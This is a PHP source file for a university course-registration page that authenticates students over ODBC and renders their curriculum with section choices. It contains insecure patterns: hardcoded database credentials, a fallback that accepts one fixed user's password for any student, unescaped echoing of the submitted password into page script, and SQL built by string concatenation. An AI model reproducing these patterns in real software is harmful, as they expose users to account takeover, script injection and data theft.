<?
    include_once('../inc/odbcss_c.php');
	include_once ('../inc/config.php');
	include_once ('../inc/activaerror.php');
	$archivoAyuda = $raizDelSitio."instrucciones.php";
    $datos_p = array();
    $mat_pre = array();
    $fvacio = TRUE;
    $lapso = "";
    $inscribe = "";
	$sede = "daceccs";
    
    function cedula_valida($ced,$clave) {
        global $datos_p;
        global $ODBCSS_IP;
        global $lapso;
        global $inscribe;
        global $sede;

        $cv = FALSE;
        if ($ced != ""){
            //echo " empece";
            $Cusers   = new ODBC_Conn("USERSDB","scael","c0n_4c4");

            $Cdatos_p = new ODBC_Conn($sede,"c","c");
            $dSQL     = " SELECT ci_e, exp_e, nombres, apellidos, carrera, ";
            $dSQL     = $dSQL."mencion_esp, pensum, dace002.c_uni_ca, ";
            $dSQL     = $dSQL."ord_tur, ord_fec, ind_acad, lapso_actual, inscribe, inscrito, ";
			$dSQL	  = $dSQL."sexo, f_nac_e";
            $dSQL     = $dSQL." FROM DACE002, ORDEN_INSCRIPCION, TBLACA010, RANGO_INSCRIPCION";
            $dSQL     = $dSQL." WHERE ci_e='$ced' AND exp_e=ord_exp" ;
            $dSQL     = $dSQL." AND tblaca010.c_uni_ca=dace002.c_uni_ca";
			$Cdatos_p->ExecSQL($dSQL);
			if ($Cdatos_p->filas == 0) { // no esta en bqto, probemos carora 
				$sede = "CARORA";
				unset($Cdatos_p);
				$Cdatos_p = new ODBC_Conn($sede,"c","c");
  				$Cdatos_p->ExecSQL($dSQL);
			}
            if ($Cdatos_p->filas == 1){
                $uSQL = "SELECT password FROM usuarios WHERE userid='".$Cdatos_p->result[0][1]."'";
                if ($Cusers->ExecSQL($uSQL)){
                    if ($Cusers->filas == 1)
                        $cv = ($clave == $Cusers->result[0][0]); 
                }
                if(!$cv) {
                    $uSQL = "SELECT password FROM usuarios WHERE userid='10146376'";
                    if ($Cusers->ExecSQL($uSQL)){
                        if ($Cusers->filas == 1)
                            $cv = ($clave == $Cusers->result[0][0]);
                     
					}
                }
                $datos_p = $Cdatos_p->result[0];
                $lapso = $datos_p[11];
            } 
        }
		// Si falla la autenticacion del usuario, hacemos un retardo
		// para reducir los ataques por fuerza bruta
		if (!$cv) {
			sleep(5); //retardo de 5 segundos
		}			
        return $cv;      
    }

    function imprime_pensum($p) {
        
        global $datos_p;
        global $lapso;
        global $ODBCSS_IP;    
		global $sede;

        $vacio=array("","");
        //primero imprime encabezados:
        print <<<ENC_1
        <tr><td width="750"><div id="DL" class="peq">
        <table align="center" border="0" cellpadding="0" cellspacing="1" width="750">
            <form method="POST" name="pensum" >
            <tr>
                <td style="width: 60px;" class="enc_p">
                    Semestre</td>
                <td style="width: 60px;" class="enc_p">
                    C&oacute;digo</td>
                <td style="width:350px;" class="enc_p">
                    Asignatura</td>
                <td style="width: 45px;" class="enc_p">
                    U.C.</td>
                <td style="width: 75px;" class="enc_p">
                    &nbsp;Condici&oacute;n R&nbsp;</td>
                <td style="width: 75px;" class="enc_p">
                    UC cursadas</td>
                <td style="width: 85px;" class="enc_p">
                    Secci&oacute;n</td>
                    
            </tr>
ENC_1
;		
        // echo $sede.'[secciones]';
		$Csecc = new ODBC_Conn($sede,"c","c");
        $sSQL = "SELECT B.c_asigna, seccion FROM tblaca004 A, materias_inscribir B ";
        $sSQL = $sSQL."WHERE A.c_asigna=B.c_asigna AND exp_e='$datos_p[1]' AND ";
        $sSQL = $sSQL."A.lapso = '$lapso' AND inscritos<tot_cup ORDER BY 1,2";
        $Csecc->ExecSQL($sSQL);
        $tS = array(); //todas las asignaturas con sus secciones
        foreach($Csecc->result as $tmS) {
            $tS=array_merge($tS,$tmS);
        }
        //ahora buscamos si ya tiene inscritas, incluidas o retiradas:
        $sSQL = "SELECT c_asigna, seccion, status FROM dace006 WHERE ";
        $sSQL = $sSQL." exp_e='$datos_p[1]' AND lapso='$lapso' AND NOT status='C' ";
        $Csecc->ExecSQL($sSQL);
        $mIns = array();  
        foreach($Csecc->result as $ss) {
            $mIns=array_merge($mIns,$ss);
        }
        //print_r($mIns);
        foreach($p as $m) {
            $mS = array_keys($tS, $m[1]);//las secciones de la asignatura a imprimir 
            $mI = array_keys($mIns, $m[1]);
          
            imprime_materia($m,$tS,$mS, $mIns, $mI);
        }
        print "<input type=\"hidden\" name=\"CBC\" value=\"\">\n";
        print "<input type=\"hidden\" name=\"CB\" value=\"\"></form> </table></td></tr>";

    }

    function imprime_materia($m,$tS,$mS, $mIns, $mI) {
        
        global $inscribe;
                
        $totSecc    = count($mS);
        $noInscrita = (count($mI) == 0);  
        //print_r(count($mI));      
        if ($inscribe =='1') {
            $msgNoInsc = 'NO INSCRIBIR';
        }
        else {
            if ($noInscrita) {
                $msgNoInsc = 'NO INCLUIR';
            }
            else {
                $msgNoInsc = 'RETIRAR';            
            }
        }    
        if($totSecc == 0) {
            $msgNoInsc = 'SIN CUPO&nbsp';
            $msgDis = ' disabled="disabled" ';
        }
        else {
            $msgDis = '';
        }
        
        $CBref      = "CB";


        print <<<P_SEM
            <tr>
                <td >
                    
P_SEM
;
        //semestre:
        print "<div id=\"$m[1]0\" class=\"inact\">";
        if (intval($m[0])>10){ print "Electiva";}
        else print "$m[0]</div></td>\n";
        //codigo:
        print "<td><div id=\"$m[1]1\" class=\"inact\">$m[1]</div></td>\n";
        //asignatura:
        print "<td><div id=\"$m[1]2\" class=\"inact\">$m[2]</div></td>\n";
        //unidades creditos:
        print "<td><div id=\"$m[1]3\" class=\"inact\">$m[3]\n";
        //correquisito:
        print "<input type=\"hidden\" name=\"CBC\" value=\"$m[4]\"></div></td>\n";
        //repitencia:
        if (!(is_null($m[5]))|| $m[5] == 'R') {
            $vRep = intval($m[5]) + 1;
        }
        else $vRep = 0;
        if ($vRep == 4) { $vRep = 'R';}
        print "<td><div id=\"$m[1]4\" class=\"inact\">$vRep&nbsp;\n";
        //unidades creditos de repitencia:
        print "<td><div id=\"$m[1]5\" class=\"inact\">$m[6]&nbsp;\n";
        print "<td><div id=$m[1]6 class=\"inact\">";
        //seccion://informacion: codigo, creditos, repite, cred_curs, tipo_lapso 
        if (($inscribe == '1') || $noInscrita) {
                
                print <<<P_SELECT0
                    <select name="$CBref" OnChange="resaltar(this)" class="peq" $msgDis style="width:82px;">
                         <option
P_SELECT0
; 
               if ($noInscrita) print " selected=\"selected\" ";
               print <<<P_SELECT1
                             value="$m[1] $m[3] $m[5] $m[6] $m[7] 0 $vRep G 0"> $msgNoInsc

P_SELECT1
;                   
            for ($k=0; $k < $totSecc; $k++) {
                print "<option ";
                $ki = $k+1;
                // Si la seccion a colocar en la lista es igual a la inscrita
                // queda seleccionada
                if (!$noInscrita){
                    if ($tS[$mS[$k]+1] == $mIns[$mI[0]+1]) print "selected=\"selected\"";
                }
                print <<<P_SELECT1
                      value="$m[1] $m[3] $m[5] $m[6] $m[7] {$tS[$mS[$k]+1]} $vRep B $ki">{$tS[$mS[$k]+1]}

P_SELECT1
;        
            }
        }
        else {

            $seccI   = $mIns[$mI[0]+1];
            $statusI = $mIns[$mI[0]+2];
            if ($statusI == '2') {
                print <<<P_SELECT2
                 <select name="$CBref" disabled="disabled" 
                    style="width:82px; color:black; background-color:#FFFF99;" class="peq"> 
                    <option
                      value="$m[1] $m[3] $m[5] $m[6] $m[7] 0 $vRep X 0">RETIRADA

P_SELECT2
;
            }
            else {
            print <<<P_SELECT3
                 <select name="$CBref" OnChange="resaltar(this)" class="peq"> 
                 <option value="$m[1] $m[3] $m[5] $m[6] $m[7] -1 $vRep X 0">&nbsp;&nbsp;&nbsp;RETIRAR&nbsp; 
                  <option selected="selected" 
                      value="$m[1] $m[3] $m[5] $m[6] $m[7] 0 $vRep B 1">$seccI 

P_SELECT3
;
            
            }
        }
        print "</select></div></td></tr>\n";
    }

    function imprime_primera_parte($dp) {
    
	global $archivoAyuda,$raizDelSitio;

    print "<SCRIPT LANGUAGE=\"Javascript\">\n<!--\n";
    print "chequeo = false;\n";
    print "ced=\"".$dp[0]."\";\n";
    print "contra=\"".$_POST['contra']."\";\n";
    print "exp_e=\"".$dp[1]."\";\n";
    print "nombres=\"".$dp[2]."\";\n";
    print "apellidos=\"".preg_replace("/\"/","'",$dp[3])."\";\n";
    print "CancelPulsado=false;\n";  
    print "var miTempo;\n";  
    print "// --></SCRIPT> \n";
	
	//$instrucciones =$archivoAyuda.'?tp='.$dp[12];
	print <<<P001
<SCRIPT LANGUAGE="Javascript" SRC="{$raizDelSitio}/md5.js">
  <!--
    alert('Error con el fichero js');
  // -->
  </SCRIPT>
<SCRIPT LANGUAGE="Javascript" SRC="{$raizDelSitio}/inscripcion.js">
  <!--
    alert('Error con el fichero js');
  // -->
  </SCRIPT>
<SCRIPT LANGUAGE="Javascript" SRC="{$raizDelSitio}/popup.js">
  <!--
    alert('Error con el fichero js');
  // -->
  </SCRIPT>
<SCRIPT LANGUAGE="Javascript" SRC="{$raizDelSitio}/popup3.js">
  <!--
    alert('Error con el fichero js');
  // -->
  </SCRIPT>
  
<style type="text/css">
<!--
#prueba {
  overflow:hidden;
  color:#00FFFF;
  background:#F7F7F7;
}

.titulo {
  text-align: center; 
  font-family:Arial; 
  font-size: 14px; 
  font-weight: normal;
  margin-top:0;
  margin-bottom:0;	
}
.tit14 {
  text-align: center; 
  font-family:Arial; 
  font-size: 14px; 
  font-weight: bold;
}
.instruc {
  font-family:Arial; 
  font-size: 12px; 
  font-weight: normal;
  background-color: #FFFFCC;
}
.datosp {
  text-align: left; 
  font-family:Arial; 
  font-size: 13px; 
  font-weight: normal;
  background-color:#F7F7F7; 
}
.enc_p {
  color:#FFFFFF;
  text-align: center; 
  font-family:Helvetica; 
  font-size: 11px; 
  font-weight: bold;
  background-color:#3366CC;
  height:20px;
}
.inact {
  text-align: center; 
  font-family:Arial; 
  font-size: 12px; 
  font-weight: normal;
  background-color:#F7F7F7; 
}
.act { 
  text-align: center; 
  font-family:Arial; 
  font-size: 12px; 
  font-weight: normal;
  background-color:#99CCFF;
}

DIV.peq {
   font-family: Arial;
   font-size: 9px;
   z-index: 1;
}
select.peq {
   font-family: Arial;
   font-size: 9px;
   z-index: 1;
}

-->
</style>  
</head>

<body  onload="javascript:self.focus();arrayMat=new Array(document.pensum.CB.length);
arraySecc=new Array(document.pensum.CB.length);
ind_acad=document.f_c.ind_acad.value;reiniciarTodo();">

<table border="0" width="750" id="table1" cellspacing="1" cellpadding="0" 
 style="border-collapse: collapse">
    <tr><td>
		<table border="0" width="750">
		<tr>
		<td width="125">
		<p align="right" style="margin-top: 0; margin-bottom: 0">
		<img border="0" src="imagenes/unex15.gif" 
		     width="75" height="75"></p></td>
		<td width="500">
		<p class="titulo">
		Universidad Nacional Experimental Polit&eacute;cnica</p>
		<p class="titulo">
		Vicerrectorado Barquisimeto</font></p>
		<p class="titulo">
		Unidad Regional de Admisi&oacute;n y Control de Estudios</font></td>
		<td width="125">&nbsp;</td>
		</tr><tr><td colspan="3" style="background-color:#99CCFF;">
		<font style="font-size:2px;"> &nbsp;</font></td></tr>
	    </table></td>
    </tr>
    <tr>
        <td width="750" class="tit14"> 
         $titulo de Alumnos Regulares</td>

    </tr>
    <tr>
    <td width="750"><br>
        <div class="tit14">Datos del Estudiante</div>
        <table align="center" border="0" cellpadding="0" cellspacing="1" width="570">
            <tbody>
                <tr>
                    <td style="width: 250px;" class="datosp">
                        Apellidos:</td>
                    <td style="width: 250px;" class="datosp">
                        Nombres:</td>
                    <td style="width: 110px;" class="datosp">
                        C&eacute;dula:</td>
                    <td style="width: 114px;" class="datosp">
                        Expediente:</td>
                </tr>

                <tr>
                    <td style="width: 250px;"  class="datosp">
P001
;
        print $dp[3];
        print <<<P002
                    </td>
                    <td style="width: 250px;" class="datosp">
P002
;
        print $dp[2];
        print <<<P003
                    </td>
                    <td style="width: 110px;" class="datosp">
P003
;
        print $dp[0];
        print <<<P004
                    </td>
                    <td style="width: 114px;" class="datosp">
P004
;       print $dp[1];
        print <<<P005
                    </td>
                <tr>
                    <td colspan="4" class="datosp">
P005
;
        print "Especialidad: $dp[4]</td>\n";
        print <<<P003
                </tr>
				<tr>
				  <td colspan="4" class="peq">&nbsp;</td>
				</tr>
				<tr>
				  <td colspan="4" class="tit14">Asignaturas que puedes seleccionar</td>
				</tr>
				<tr>
				<td colspan="4" class="titulo" 
				    style="color:blue; font-weight:bold; cursor:pointer;";
					OnMouseOver='this.style.backgroundColor="#99CCFF";this.style.color="#000000";'
					OnMouseOut='this.style.backgroundColor="#FFFFFF"; this.style.color="#0000FF";'
					OnClick='mostrar_ayuda("{$instrucciones}");'>
					Haz clic aqu&iacute; para leer las Instrucciones</td>
				</tr>
            </tbody>
        </table>
    </td>
    </tr>
    <tr>
P003
; 
    }
    
    function imprime_ultima_parte($dp) {
    
    global $inscribe;
    global $inscrito;
    global $sede;
        
    if (isset($_POST['asignaturas'])) {
        $lasAsignaturas = $_POST['asignaturas'];
        $asigSC = $_POST['asigSC'];
        $seccSC = $_POST['seccSC'];
        
    }
    else {
        $lasAsignaturas = "";
        $asigSC = "";
        $seccSC = "";

    }
    print <<<U001
     <tr width="570" >
        <td >
        <table bgcolor="#F7F7F7" align="center" border="0" cellpadding="0" 
            cellspacing="0" width="570">
          <tbody>
          <form width="570" align="rigth" name="totales">
            <tr><td><font size="2" face="Arial">&nbsp;
                        Total Materias :&nbsp;</font>
                        <input readonly="readonly" maxlength="2" size="2" 
                            name="t_mat" value="0"
                            style="border-style: solid; border-width: 0px; 
                            text-align: left; font-family: arial; 
                            font-size: 10pt; color: black; background-color: #FFFF99;">
                        <font size="2" face="Arial">&nbsp;
                        Total cr&eacute;ditos:&nbsp;</font>
                        <input readonly="readonly" maxlength="2" size="2" 
                            tabindex="1" name="t_uc" value="0"
                            style="border-style: solid; border-width: 0px; 
                            text-align: left; font-family: arial; 
                            font-size: 10pt; color: black; background-color: #FFFF99;">
                        <font size="2" face="Arial">&nbsp;&nbsp;</font>
                 </td>
            </tr>
          </form>  
          </tbody>
        </table>
        </td>
     </tr>
 
    <tr width="570" >
        <td >
        <table align="center" border="0" cellpadding="0" 
            cellspacing="0" width="400">
          <tbody>
          <form width="400" align="center" name="f_c" method="POST" action="registrar.php">
U001
;
    print <<<U003
                <tr bgcolor="#F7F7F7" >
                </tr>
             </tbody>
          </table>
         <table align="center" border="0" cellpadding="0" 
            cellspacing="0" width="400">
          <tbody>
              <tr>
                    <td valign="top"><p align="left">
                        <input type="reset" value="Borrar" name="B1" 
                         onclick="javascript:reiniciarTodo();"></p> 
                    </td>
                    <td valign="top"><p align="right">
                        <input type="button" value="Salir" name="B1"
                         onclick="javascript:self.close();"></p> 
                    </td>
                    <td><p align="right">
                        <input type="button" value="Inscribirme/Imprimir" name="B1"
                        onclick="Inscribirme();"></p>    
                        <input type="hidden" name="asignaturas" value="$lasAsignaturas">
                        <input type="hidden" name="asigSC" value="$asigSC">
                        <input type="hidden" name="seccSC" value="$seccSC">
                        <input type="hidden" name="exp_e" value="z">
                        <input type="hidden" name="cedula" value="x">
                        <input type="hidden" name="contra" value="{$_POST['contra']}">
                        <input type="hidden" name="carrera" value="z">
                        <input type="hidden" name="lapso" value="$dp[11]">
                        <input type="hidden" name="inscribe" value="$inscribe">
                        <input type="hidden" name="ind_acad" value="$dp[10]">          
                        <input type="hidden" name="inscrito" value="$inscrito">
                        <input type="hidden" name="sede" value="$sede">
                        <input type="hidden" name="sexo" value="$dp[14]">
                        <input type="hidden" name="f_nac_e" value="$dp[15]">
                        <input type="hidden" name="c_inicial" value="0">

                    </td>
                </tr>
            </form>
            </tbody>
          </table>
        </div>
       </td>
    </tr>
 </table>

<!-- codigo para definir la ventana de popup -->
<script>
if (NS4) {document.write('<LAYER NAME="floatlayer" style="visibility\:hide" LEFT="'+floatX+'" TOP="'+floatY+'">');}
if ((IE4) || (NS6)) {document.write('<div id="floatlayer" style="position:absolute; left:'+floatX+'; top:'+floatY+'; z-index:1; filter: alpha(opacity=100); opacity: 1; visibility:hidden">');
}
</script>
<table border="0" width="500" bgcolor="#2816B8" cellspacing="0" cellpadding="5">
<tr>
<td width="100%">
  <table border="0" width="100%" cellspacing="0" cellpadding="0" height="36">
  <tr>
  <td id="titleBar" style="cursor:move; text-align:center" width="100%">
  <ilayer width="100%" onSelectStart="return false">
  <layer width="100%" onMouseover="isHot=true;if (isN4) ddN4(theLayer)" onMouseout="isHot=false">
  <font face="Arial" size=2 color="#FFFFFF">
    VERIFICA Y CONFIRMA TU SELECCI&Oacute;N</font>
  </layer>
  </ilayer>
  </td>
  <td style="cursor:pointer" valign="top">
  <a href="#" onClick="hideMe();return false"><font color=#ffffff size=2 face=arial  style="text-decoration:none; vertical-align:top;">X</font></a>
  </td>
  </tr>
  <tr>
  <td width="100%" bgcolor="#FFFFFF" style="padding:4px" colspan="2">
<!-- PLACE YOUR CONTENT HERE //-->  
<table>
<tr><td colspan=2> <span style="font-family:Arial; font-size:13px; font-weight:bold;
                                text-align:left">
$dp[2]:<br>Por favor escribe de nuevo tu clave
 y pulsa "Aceptar" para procesar tu selecci&oacute;n. RECUERDA: Despu&eacute;s
 de procesada la inscripci&oacute;n ya NO podr&aacute;s hacer cambios.</span>
    <td>
</tr>
<tr><td colspan=2>
<span style="font-family:Arial; font-size:13px; font-weight:bold;
             text-align:left; background-color:#FFFF33">
	Y POR FAVOR INDICA TU SEXO Y TU FECHA DE NACIMIENTO CORRECTA PARA PODER 
		CONTINUAR CON LA INSCRIPCI&Oacute;N:</td></tr>
<tr>
  <td colspan=2 valign="middle"><p align="left">
     <font face=arial size=2><b> Clave:&nbsp;</b>
       <input type="password" name="pV" id="pV"
         style="background-color:#99CCFF" size="20">
  </td>
</tr>
<tr><td style="font-family:Arial; font-size:13px; font-weight:bold;">
		Sexo:</td><td style="font-family:Arial; font-size:13px; font-weight:bold;">
		Fecha de Nacimiento:</td>
<tr><td><select name="sexoN" id="sexoN">
              <option value="1" >Masculino</option>
              <option value="0" >Femenino</option>
              </select></td>

    <td><select name="diaN" id="diaN">
        <option > 01</option>
        <option > 02</option>
        <option > 03</option>
        <option > 04</option>
        <option > 05</option>
        <option > 06</option>
        <option > 07</option>
        <option > 08</option>
        <option > 09</option>
        <option > 10</option>
        <option > 11</option>
        <option > 12</option>
        <option > 13</option>
        <option > 14</option>
        <option > 15</option>
        <option > 16</option>
        <option > 17</option>
        <option > 18</option>
        <option > 19</option>
        <option > 20</option>
        <option > 21</option>
        <option > 22</option>
        <option > 23</option>
        <option > 24</option>
        <option > 25</option>
        <option > 26</option>
        <option > 27</option>
        <option > 28</option>
        <option > 29</option>
        <option > 30</option>
        <option > 31</option>
		</select> de
        <select name="mesN" id="mesN">
		<option value="01" >ENERO</option>
        <option value="02" >FEBRERO</option>
		<option value="03" >MARZO</option>
        <option value="04" >ABRIL</option>
        <option value="05" >MAYO</option>
		<option value="06" >JUNIO</option>
        <option value="07" >JULIO</option>
        <option value="08" >AGOSTO</option>
        <option value="09" >SEPTIEMBRE</option>
        <option value="10" >OCTUBRE</option>
        <option value="11" >NOVIEMBRE</option>
        <option value="12" >DICIEMBRE</option>
        </select> de 19
        <input name="anioN" type="text" class="inputtext" id="anioN" value="" size="2" maxlength="2">
</td></tr></span>
<tr>
  <td valign = "middle"><p align="center">
     <input type="button" value="Aceptar" name="aBA" onclick="verificar()"> 
     </td>
   <td valign = "middle"><p align="center">
     <input type="button" value="Cancelar" name="aBC" onclick="cancelar()"> 
   </td>  
 </tr>
 </table>
     
<!-- END OF CONTENT AREA //-->
  </td>
  </tr>
  </table> 
</td>
</tr>
</table>
</div>

<script>
if (NS4)
{
document.write('</LAYER>');
}
if ((IE4) || (NS6))
{
document.write('</DIV>');
}
ifloatX=floatX;
ifloatY=floatY;
lastX=-1;
lastY=-1;
define();
window.onresize=define;
window.onscroll=define;
adjust();
U003
;
   if (($inscrito == '1') && ($inscribe != '2')){
       print "\nprepdata(document.pensum,document.f_c);";
       print "\nalert(document.f_c.inscribe.value+'  '+document.f_c.inscrito.value);";
	   print "\ndocument.f_c.submit();\n";
   }
    print <<<U004
</script>
</body>
</html>
U004
;
    }
    
    function volver_a_indice($vacio,$fueraDeRango, $habilitado=true){
	
    //regresa a la pagina principal:
	global $raizDelSitio;
    if ($vacio) {
?>
            <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
            <META HTTP-EQUIV="Refresh" 
            CONTENT="10;URL=<?php echo $raizDelSitio; ?>">
        </head>
        <body>vacio
        </body>
        </html>
<?php
    }
    else {
?>          <script languaje="Javascript">
            <!--
            function entrar_error() {
<?php
        if ($fueraDeRango) {
			if($habilitado){
?>             
		mensaje = "Lo siento, no puedes inscribirte en este horario.\n";
        mensaje = mensaje + "Por favor, espera tu turno.";
<?php
			}
			else {
?>
	    mensaje = 'Lo siento, no esta habilitado el sistema.';
<?php
			}
		}
        else {
?>
        mensaje = "Clave incorrecta. Por favor intente de nuevo";
<?php
        }
?>
                alert(mensaje);
                window.close();
                return true; 
        }

            //-->
            </script>
        </head>
                    <body onload ="return entrar_error();" >

        </body>
        </html>
<?php
    }
}    

function alumno_en_rango($horaTurno, $fechaTurno) {

	$fechaActual = time() - 3600*date('I');
	$tHora = intval(substr($horaTurno,0,2),10);
	$tMin = intval(substr($horaTurno,2,2),10);
	$tFecha = explode('-',$fechaTurno); //anio-mes-dia
	$suFecha = mktime($tHora, $tMin, 0, $tFecha[1], $tFecha[2], $tFecha[0],date('I'));
	return ($suFecha <= $fechaActual);
}

    // Programa principal
    //leer las variables enviadas
    //$_POST['cedula']='17583838';
    //$_POST['contra']='827ccb0eea8a706c4c34a16891f84e7b';       
    if(isset($_POST['cedula']) && isset($_POST['contra'])) {
        $cedula=$_POST['cedula'];
        $contra=$_POST['contra'];
        // limpiemos la cedula y coloquemos los ceros faltantes
        $cedula = ltrim(preg_replace("/[^0-9]/","",$cedula),'0');
        $cedula = substr("00000000".$cedula, -8);
        $fvacio = false; 
		//echo $cedula;
		//echo $contra;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
<title><?php echo $tProceso . $lapso; ?></title>
<?
        if(!$fvacio && cedula_valida($cedula,$contra)) {
            // Revisamos si es su turno de inscripcion:
            //    if (intval($datos_p[8])<=intval($datos_p[9])) {
				if(alumno_en_rango($datos_p[8],$datos_p[9])) {
            // pintamos su pensum y su formulario para llenar:
            // ya tenemos en $datos_p los datos personales
                $exped    = $datos_p[1];
                $mencion  = $datos_p[5];
                $pensum   = $datos_p[6];
                $c_carr   = $datos_p[7];
                $lapso    = $datos_p[11];
                $inscribe = $datos_p[12];
				$inscrito = intval('0'.$datos_p[13]);
                $Cmat = new ODBC_Conn($sede,"c","c");
				// echo $sede.'[cmat]';
                $mSQL = "SELECT semestre, tblaca008.c_asigna, asignatura, ";
                $mSQL = $mSQL."unid_credito, co_req, repite, cre_cur, tipo_lapso FROM materias_inscribir, ";
                $mSQL = $mSQL."tblaca009, tblaca008 WHERE ";
                $mSQL = $mSQL."materias_inscribir.c_asigna=tblaca009.c_asigna AND "; 
                $mSQL = $mSQL."mencion='".$mencion."' AND pensum='".$pensum."' ";
                $mSQL = $mSQL."AND exp_e='".$exped."' AND c_uni_ca='".$c_carr."' ";
                $mSQL = $mSQL."AND tblaca008.c_asigna=tblaca009.c_asigna ORDER BY semestre";
                $Cmat->ExecSQL($mSQL);
                //print $Cmat->status;
                $lista_m=$Cmat->result;
                unset($Cmat);
                $carr_esp= array('.'=>"",
                                 'A'=>" (COMUNICACIONES)", 
                                 'B'=>" (COMPUTACI&Oacute;N)",
                                 'C'=>" (CONTROL)");
                $datos_p[4] = $datos_p[4].$carr_esp[$datos_p[5]];
				if ($inscribe != '0') {
					imprime_primera_parte($datos_p);
                    imprime_pensum($lista_m);
					imprime_ultima_parte($datos_p);
				}
				else volver_a_indice(false,true,false);//inscripciones no habilitadas
            }
            else volver_a_indice(false,true); //alumno fuera de rango
        }
        else volver_a_indice(false,false); //cedula o clave incorrecta
    }
    else volver_a_indice(true,false); //formulario vacio
?>
